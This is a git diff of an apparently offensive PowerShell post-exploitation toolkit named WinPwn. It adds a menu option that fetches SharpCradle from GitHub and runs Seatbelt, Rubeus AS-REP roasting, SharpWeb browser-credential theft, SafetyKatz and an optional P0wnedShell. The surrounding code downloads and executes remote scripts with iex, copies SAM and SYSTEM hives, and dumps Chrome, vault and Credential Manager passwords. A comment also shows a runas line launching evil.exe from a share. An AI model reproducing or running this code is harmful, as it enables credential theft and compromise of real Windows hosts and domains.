@@ -6,7 +6,6 @@ function Unzip
 
     [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
 }
-
 function AmsiBypass
 {
     <#
@@ -111,6 +110,13 @@ function pathCheck
             
         }
         else {mkdir $currentPath\Exploitation\}
+	
+	
+        if (Test-Path $currentPath\Vulnerabilities\)
+        {
+            
+        }
+        else {mkdir $currentPath\Vulnerabilities\}
 
 }
 
@@ -121,8 +127,72 @@ function sharpcradle{
         Author: @securethisshit
         License: BSD 3-Clause
     #>
+        Param
+    (
+        [bool]
+        $allthosedotnet
+    )
+    pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-    if ([Environment]::Is64BitProcess)
+    if ($allthosedotnet)
+    {
+    	    if ([Environment]::Is64BitProcess)
+    	    {
+       		[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+       		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
+       		Write-Host -ForegroundColor Yellow 'Executing Seatbelt. Output goes to .\LocalRecon\'
+		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Seatbelt.exe all $currentPath\LocalRecon\SeatBeltOutput.txt
+		Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting. Output goes to .\Exploitation\'
+		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Rubeus.exe asreproast /format:hashcat >> $currentPath\Exploitation\ASreproasting.txt
+		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Watson.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt
+		Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'
+		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpWeb.exe all >> $currentPath\Exploitation\Browsercredentials.txt
+		Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns. Output goes to .\Vulnerabilities\'
+		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpUp.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt	
+		if (isadmin)
+		{
+			Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns. Output goes to .\Vulnerabilities\'
+			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpUp.exe audit $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt
+			Write-Host -ForegroundColor Yellow 'Safetykatz ftw. Output goes to .\Exploitation\'
+			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SafetyKatz.exe >> $currentPath\Exploitation\SafetyCreds.txt
+		}
+		$P0wnedShell = Read-Host -Prompt 'Open up an P0wnedShell? (yes/no)'
+		if ($P0wnedShell -eq "yes" -or $P0wnedShell -eq "y" -or $P0wnedShell -eq "Yes" -or $P0wnedShell -eq "Y")
+    		{
+			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/pwned_x64/notepad.exe
+		}
+    		del .\cradle.exe
+    	    }
+    	    else
+    	    {
+       		[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+       		Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
+       		Write-Host -ForegroundColor Yellow 'Executing Seatbelt. Output goes to .\LocalRecon\'
+		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Seatbelt.exe all $currentPath\LocalRecon\SeatBeltOutput.txt
+		Write-Host -ForegroundColor Yellow 'Doing Kerberoasting + ASRepRoasting. Output goes to .\Exploitation\'
+		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Rubeus.exe asreproast /format:hashcat >> $currentPath\Exploitation\ASreproasting.txt
+		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/Watson.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns.txt
+		Write-Host -ForegroundColor Yellow 'Getting all theese Browser Creds using Sharpweb. Output goes to .\Exploitation\'
+		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpWeb.exe all >> $currentPath\Exploitation\Browsercredentials.txt
+		Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns. Output goes to .\Vulnerabilities\'
+		.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpUp.exe >> $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt	
+		if (isadmin)
+		{
+			Write-Host -ForegroundColor Yellow 'Searching for Privesc vulns. Output goes to .\Vulnerabilities\'
+			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SharpUp.exe audit $currentPath\Vulnerabilities\Privilege_Escalation_Vulns_SharpUp.txt
+			Write-Host -ForegroundColor Yellow 'Safetykatz ftw. Output goes to .\Exploitation\'
+			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/Ghostpack/SafetyKatz.exe >> $currentPath\Exploitation\SafetyCreds.txt
+		}
+		$P0wnedShell = Read-Host -Prompt 'Open up an P0wnedShell? (yes/no)'
+		if ($P0wnedShell -eq "yes" -or $P0wnedShell -eq "y" -or $P0wnedShell -eq "Yes" -or $P0wnedShell -eq "Y")
+    		{
+			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/pwned_x64/notepad.exe
+		}
+		del .\cradle.exe
+    	    }
+	    
+    }
+    else if ([Environment]::Is64BitProcess)
     {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-Webrequest -Uri https://github.com/SecureThisShit/Creds/blob/master/Ghostpack/SharpCradle.exe?raw=true -Outfile $currentPath\cradle.exe
@@ -374,13 +444,13 @@ function localreconmodules
             if($UseWUServer -eq 1 -and $WUServer.ToLower().StartsWith("http://")) 
 	        {
         	    Write-Host -ForegroundColor Yellow 'WSUS Server over HTTP detected, most likely all hosts in this domain can get fake-Updates!'
-		        echo "Wsus over http detected! Fake Updates can be delivered here. $UseWUServer / $WUServer " >> "$currentPath\LocalRecon\WsusoverHTTP.txt"
+		        echo "Wsus over http detected! Fake Updates can be delivered here. $UseWUServer / $WUServer " >> "$currentPath\Vulnerabilities\WsusoverHTTP.txt"
             }
 
             #Check for SMB Signing
             Write-Host -ForegroundColor Yellow 'Check SMB-Signing for the local system'
             iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Invoke-SMBNegotiate.ps1')
-            Invoke-SMBNegotiate -ComputerName localhost >> "$currentPath\LocalRecon\SMBSigningState.txt"
+            Invoke-SMBNegotiate -ComputerName localhost >> "$currentPath\Vulnerabilities\SMBSigningState.txt"
 
             #Collecting Informations
             Write-Host -ForegroundColor Yellow 'Collecting local system Informations for later lookup, saving them to .\LocalRecon\'
@@ -402,7 +472,7 @@ function localreconmodules
 	    Get-Installedsoftware -Property DisplayVersion,InstallDate >> "$currentPath\LocalRecon\InstalledSoftwareAll.txt"
             
 	    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Invoke-Vulmap.ps1')
-	    Invoke-Vulmap >> "$currentPath\LocalRecon\VulnerableSoftware.txt"
+	    Invoke-Vulmap >> "$currentPath\Vulnerabilities\VulnerableSoftware.txt"
             
             $passhunt = Read-Host -Prompt 'Do you want to search for Passwords on this system using passhunt.exe? (Its worth it) (yes/no)'
             if ($passhunt -eq "yes" -or $passhunt -eq "y" -or $passhunt -eq "Yes" -or $passhunt -eq "Y")
@@ -413,13 +483,13 @@ function localreconmodules
             # Collecting more information
             Write-Host -ForegroundColor Yellow 'Checking for accesible SAM/SYS Files'
             If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP'){Get-ChildItem -path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\SNMP' -Recurse >> "$currentPath\LocalRecon\SNMP.txt"}            
-            If (Test-Path -Path %SYSTEMROOT%\repair\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\repair\SAM "$currentPath\LocalRecon\SAM"}
-            If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\LocalRecon\SAM"}
-            If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\RegBack\SAM "$currentPath\LocalRecon\SAM"}
-            If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\LocalRecon\SAM"}
-            If (Test-Path -Path %SYSTEMROOT%\repair\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\repair\system "$currentPath\LocalRecon\SYS"}
-            If (Test-Path -Path %SYSTEMROOT%\System32\config\SYSTEM){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\SYSTEM "$currentPath\LocalRecon\SYS"}
-            If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\RegBack\system "$currentPath\LocalRecon\SYS"}
+            If (Test-Path -Path %SYSTEMROOT%\repair\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\repair\SAM "$currentPath\Vulnerabilities\SAM"}
+            If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\Vulnerabilities\SAM"}
+            If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\RegBack\SAM "$currentPath\Vulnerabilities\SAM"}
+            If (Test-Path -Path %SYSTEMROOT%\System32\config\SAM){Write-Host -ForegroundColor Yellow "SAM File reachable, looking for SYS?";copy %SYSTEMROOT%\System32\config\SAM "$currentPath\Vulnerabilities\SAM"}
+            If (Test-Path -Path %SYSTEMROOT%\repair\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\repair\system "$currentPath\Vulnerabilities\SYS"}
+            If (Test-Path -Path %SYSTEMROOT%\System32\config\SYSTEM){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\SYSTEM "$currentPath\Vulnerabilities\SYS"}
+            If (Test-Path -Path %SYSTEMROOT%\System32\config\RegBack\system){Write-Host -ForegroundColor Yellow "SYS File reachable, looking for SAM?";copy %SYSTEMROOT%\System32\config\RegBack\system "$currentPath\Vulnerabilities\SYS"}
 
             Write-Host -ForegroundColor Yellow 'Checking Registry for potential passwords'
             REG QUERY HKLM /F "passwor" /t REG_SZ /S /K >> "$currentPath\LocalRecon\PotentialHKLMRegistryPasswords.txt"
@@ -431,22 +501,22 @@ function localreconmodules
 	    	    reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" >> "$currentPath\LocalRecon\Winlogon.txt"
 	        }
             If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SYSTEM\Current\ControlSet\Services\SNMP'){reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" >> "$currentPath\LocalRecon\SNMPParameters.txt"}
-            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Software\SimonTatham\PuTTY\Sessions'){reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" >> "$currentPath\LocalRecon\PuttySessions.txt"}
-            If (Test-Path -Path 'Registry::HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password'){reg query "HKCU\Software\ORL\WinVNC3\Password" >> "$currentPath\LocalRecon\VNCPassword.txt"}
-            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4'){reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password >> "$currentPath\LocalRecon\RealVNCPassword.txt"}
+            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Software\SimonTatham\PuTTY\Sessions'){reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" >> "$currentPath\Vulnerabilities\PuttySessions.txt"}
+            If (Test-Path -Path 'Registry::HKEY_CURRENT_USER\Software\ORL\WinVNC3\Password'){reg query "HKCU\Software\ORL\WinVNC3\Password" >> "$currentPath\Vulnerabilities\VNCPassword.txt"}
+            If (Test-Path -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4'){reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password >> "$currentPath\Vulnerabilities\RealVNCPassword.txt"}
 
-            If (Test-Path -Path C:\unattend.xml){copy C:\unattend.xml "$currentPath\LocalRecon\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
-            If (Test-Path -Path C:\Windows\Panther\Unattend.xml){copy C:\Windows\Panther\Unattend.xml "$currentPath\LocalRecon\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
-            If (Test-Path -Path C:\Windows\Panther\Unattend\Unattend.xml){copy C:\Windows\Panther\Unattend\Unattend.xml "$currentPath\LocalRecon\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
-            If (Test-Path -Path C:\Windows\system32\sysprep.inf){copy C:\Windows\system32\sysprep.inf "$currentPath\LocalRecon\sysprep.inf"; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}
-            If (Test-Path -Path C:\Windows\system32\sysprep\sysprep.xml){copy C:\Windows\system32\sysprep\sysprep.xml "$currentPath\LocalRecon\sysprep.inf"; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}
+            If (Test-Path -Path C:\unattend.xml){copy C:\unattend.xml "$currentPath\Vulnerabilities\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
+            If (Test-Path -Path C:\Windows\Panther\Unattend.xml){copy C:\Windows\Panther\Unattend.xml "$currentPath\Vulnerabilities\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
+            If (Test-Path -Path C:\Windows\Panther\Unattend\Unattend.xml){copy C:\Windows\Panther\Unattend\Unattend.xml "$currentPath\Vulnerabilities\unattended.xml"; Write-Host -ForegroundColor Yellow 'Unattended.xml Found, check it for passwords'}
+            If (Test-Path -Path C:\Windows\system32\sysprep.inf){copy C:\Windows\system32\sysprep.inf "$currentPath\Vulnerabilities\sysprep.inf"; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}
+            If (Test-Path -Path C:\Windows\system32\sysprep\sysprep.xml){copy C:\Windows\system32\sysprep\sysprep.xml "$currentPath\Vulnerabilities\sysprep.inf"; Write-Host -ForegroundColor Yellow 'Sysprep.inf Found, check it for passwords'}
 
-            Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue >> "$currentPath\LocalRecon\webconfigfiles.txt"
+            Get-Childitem -Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue >> "$currentPath\Vulnerabilities\webconfigfiles.txt"
 
             Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize >> "$currentPath\LocalRecon\RunningTasks.txt"
 
             Write-Host -ForegroundColor Yellow 'Checking for usable credentials (cmdkey /list)'
-            cmdkey /list >> "$currentPath\LocalRecon\SavedCredentials.txt" # runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
+            cmdkey /list >> "$currentPath\Vulnerabilities\SavedCredentials.txt" # runas /savecred /user:WORKGROUP\Administrator "\\10.XXX.XXX.XXX\SHARE\evil.exe"
 
 
 
@@ -500,7 +570,7 @@ function localreconmodules
             {
                 iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/Get-ChromeDump.ps1')
                 Install-SqlLiteAssembly
-                Get-ChromeDump >> "$currentPath\LocalRecon\Chrome_Credentials.txt"
+                Get-ChromeDump >> "$currentPath\Exploitation\Chrome_Credentials.txt"
                 Get-ChromeHistory >> "$currentPath\LocalRecon\ChromeHistory.txt"
                 Write-Host -ForegroundColor Yellow 'Done, look in the localrecon folder for creds/history:'
             }
@@ -510,7 +580,7 @@ function localreconmodules
             {
 	    	[void][Windows.Security.Credentials.PasswordVault,Windows.Security.Credentials,ContentType=WindowsRuntime]
 	    	$vault = New-Object Windows.Security.Credentials.PasswordVault 
-	    	$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } >> "$currentPath\LocalRecon\InternetExplorer_Credentials.txt"
+	    	$vault.RetrieveAll() | % { $_.RetrievePassword();$_ } >> "$currentPath\Exploitation\InternetExplorer_Credentials.txt"
 	    }
 }
 
@@ -726,7 +796,7 @@ function domainreconmodules
                         if (spoolscan -target $domc)
                         {
                             Write-Host -ForegroundColor Yellow 'Found vulnerable DC. You can take the DC-Hash for SMB-Relay attacks now'
-                            echo "$domc" >> "$currentPath\DomainRecon\MS-RPNVulnerableDC_$domc.txt"
+                            echo "$domc" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableDC_$domc.txt"
                         }
                     }
 		    $othersystems = Read-Host -Prompt 'Start MS-RPRN RPC Service Scan for other active Windows Servers in the domain? (yes/no)'
@@ -739,7 +809,7 @@ function domainreconmodules
                         	if (spoolscan -target $acserver)
                         	{
                             		Write-Host -ForegroundColor Yellow 'Found vulnerable Server - $acserver. You can take the DC-Hash for SMB-Relay attacks now'
-                            		echo "$acserver" >> "$currentPath\DomainRecon\MS-RPNVulnerableServers.txt"
+                            		echo "$acserver" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableServers.txt"
                         	}
                     	}
 		    }
@@ -791,7 +861,7 @@ function MS17-10
          	if (Scan-MS17-10 -target $acserver)
                 {
                 	Write-Host -ForegroundColor Yellow 'Found vulnerable Server - $acserver. Just Pwn this system!'
-                        echo "$acserver" >> "$currentPath\Exploitation\MS17-10_VulnerableServers.txt"
+                        echo "$acserver" >> "$currentPath\Vulnerabilities\MS17-10_VulnerableServers.txt"
                 }
         }
     }
@@ -804,7 +874,7 @@ function MS17-10
          	if (Scan-MS17-10 -target $acserver)
                 {
                 	Write-Host -ForegroundColor Yellow 'Found vulnerable System - $acserver. Just Pwn it!'
-                        echo "$acserver" >> "$currentPath\Exploitation\MS17-10_VulnerableSystems.txt"
+                        echo "$acserver" >> "$currentPath\Vulnerabilities\MS17-10_VulnerableSystems.txt"
                 }
         }
     }
@@ -831,14 +901,14 @@ function powerSQL
     $Targets.Instance >> "$currentPath\DomainRecon\SQLServer_AccessibleInstances.txt"
     
     Write-Host -ForegroundColor Yellow 'Checking Default Credentials for all Instances:'
-    Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose >> "$currentPath\DomainRecon\SQLServer_DefaultLogin.txt"
+    Get-SQLInstanceDomain | Get-SQLServerLoginDefaultPw -Verbose >> "$currentPath\Vulnerabilities\SQLServer_DefaultLogin.txt"
     
     Write-Host -ForegroundColor Yellow 'Dumping Information and Auditing all accesible Databases:'
     foreach ($line in $Targets.Instance)
     {
         Get-SQLServerInfo -Verbose -Instance $line >> "$currentPath\DomainRecon\SQLServer_Accessible_GeneralInformation.txt"
         Invoke-SQLDumpInfo -Verbose -Instance $line $line >> "$currentPath\DomainRecon\SQLServer_Accessible_DumpInformation.txt"
-        Invoke-SQLAudit -Verbose -Instance $line >> "$currentPath\DomainRecon\SQLServer_Accessible_Audit_$Targets.Computername.txt"
+        Invoke-SQLAudit -Verbose -Instance $line >> "$currentPath\Vulnerabilities\SQLServer_Accessible_Audit_$Targets.Computername.txt"
         mkdir "$currentPath\DomainRecon\SQLInfoDumps"
         $Targets | Get-SQLColumnSampleDataThreaded -Verbose -Threads 10 -Keyword "password,pass,credit,ssn,pwd" -SampleSize 2 -ValidateCC -NoDefaults >> "$currentPath\DomainRecon\SQLServer_Accessible_PotentialSensitiveData.txt" 
     }
@@ -914,22 +984,22 @@ function privescmodules
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/DumpWCM.ps1')
 
     Write-Host -ForegroundColor Yellow 'Dumping Windows Credential Manager:'
-    Invoke-WCMDump >> $currentPath\LocalPrivesc\WCMCredentials.txt
+    Invoke-WCMDump >> $currentPath\Exploitation\WCMCredentials.txt
 
     Write-Host -ForegroundColor Yellow 'Getting Local Privilege Escalation possibilities:'
 
     Write-Host -ForegroundColor Yellow 'Getting GPPPasswords:'
-    amazon >> $currentPath\LocalPrivesc\GPP_Auto.txt
-    Shockley >> $currentPath\LocalPrivesc\GPP_Passwords.txt
+    amazon >> $currentPath\Vulnerabilities\GPP_Auto.txt
+    Shockley >> $currentPath\Vulnerabilities\GPP_Passwords.txt
 
     Write-Host -ForegroundColor Yellow 'Looking for Local Privilege Escalation possibilities:'
-    families >> $currentPath\LocalPrivesc\All_Localchecks.txt
+    families >> $currentPath\Vulnerabilities\All_Localchecks.txt
 
     Write-Host -ForegroundColor Yellow 'Looking for MS-Exploits on this local system for Privesc:'
-    proportioned >> $currentPath\LocalPrivesc\Sherlock_Vulns.txt
+    proportioned >> $currentPath\Vulnerabilities\Sherlock_Vulns.txt
     
     iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/PowershellScripts/IkeextCheck.ps1')
-    Invoke-IkeextCheck >> "$currentPath\LocalPrivesc\IkeExtVulnerable.txt"
+    Invoke-IkeextCheck >> "$currentPath\Vulnerabilities\IkeExtVulnerable.txt"
     
     $search = Read-Host -Prompt 'Start Just Another Windows (Enum) Script? (yes/no)'
     if ($search -eq "yes" -or $search -eq "y" -or $search -eq "Yes" -or $search -eq "Y")
@@ -1367,7 +1437,9 @@ __        ___       ____
         Write-Host -ForegroundColor Green '17. Just one ADRecon Report for me! '
         Write-Host -ForegroundColor Green '18. Search for potential vulnerable web apps (low hanging fruits)! '
         Write-Host -ForegroundColor Green '19. Find some network shares! '
-        Write-Host -ForegroundColor Green '20. Exit. '
+	Write-Host -ForegroundColor Green '20. Execute some C# Magic for Creds, Recon and Privesc!'
+	Write-Host -ForegroundColor Green '21. Load custom C# Binaries from a webserver to Memory and execute them!'
+        Write-Host -ForegroundColor Green '22. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -1392,9 +1464,11 @@ __        ___       ____
             17{reconAD}
             18{fruit}
             19{sharenumeration}
+	    20{sharpcradle -allthosedotnet $true}
+	    21{sharpcradle}
        }
     }
- While ($masterquestion -ne 20)
+ While ($masterquestion -ne 22)
      
     
     #End
